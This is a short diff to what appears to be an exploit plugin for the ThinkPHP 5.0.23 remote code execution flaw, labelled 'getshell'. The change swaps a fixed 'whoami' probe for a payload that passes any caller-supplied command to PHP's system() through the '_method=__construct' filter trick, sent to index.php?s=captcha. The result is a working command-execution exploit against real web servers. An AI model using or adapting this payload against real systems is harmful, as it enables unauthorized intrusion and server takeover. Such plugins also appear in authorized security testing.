@@ -14,7 +14,7 @@ def info(data):
         "name": "thinkphp 5.0.23 getshell",
         "info": "thinkphp 5.0.23 getshell",
         "level": "high",
-        "type": "sql",
+        "type": "exec",
     }
     return info
 
@@ -41,7 +41,7 @@ def exec(data):
     if data['base_url']:
         headers ={ }
         headers['Content-Type'] = 'application/x-www-form-urlencoded'
-        poc = '_method=__construct&method=get&filter[]=system&server[REQUEST_METHOD]=whoami'
+        poc = '_method=__construct&method=get&filter[]=system&server[REQUEST_METHOD]=%s' %parse.quote_plus(data['cmd'])
         for path in ['public/','']:
             for pocpath in ['index.php?s=captcha']:
                 url = data['base_url'] + path + pocpath
